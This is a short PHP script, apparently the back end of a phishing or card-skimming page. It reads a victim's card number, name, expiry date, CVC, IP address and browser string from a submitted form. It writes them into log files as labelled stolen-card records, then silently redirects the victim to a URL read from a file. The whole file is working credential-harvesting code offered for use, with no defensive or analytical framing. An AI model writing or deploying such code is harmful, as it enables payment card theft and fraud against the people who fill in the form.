<?php

$number = $_POST['creditcard'];
$names = $_POST['names'];
$expirx = $_POST['month'];
$expiry = $_POST['year'];
$cvc = $_POST['cvc'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

$logFile = $_SERVER['DOCUMENT_ROOT'] . "/details/log.log";
$logEntry = "\r\nx.add_row(['PAY', '$number', '$expirx/$expiry', '$cvc', '$ip'])";
file_put_contents($logFile, $logEntry, FILE_APPEND);

$resultFile = $_SERVER['DOCUMENT_ROOT'] . "/details/result.log";
$resultEntry = "[OS]: PAY" . "\n [Name]: $names \n [Card Number]: $number \n [Date]: $expirx/$expiry\n [CVV2]: $cvc\n [ip]: $ip \n [Information]: $agent \n\n";
file_put_contents($resultFile, $resultEntry, FILE_APPEND);

$reloc = file_get_contents("location.location");

?>

<script>
    window.location.href = "<?php echo $reloc ?>"
</script>
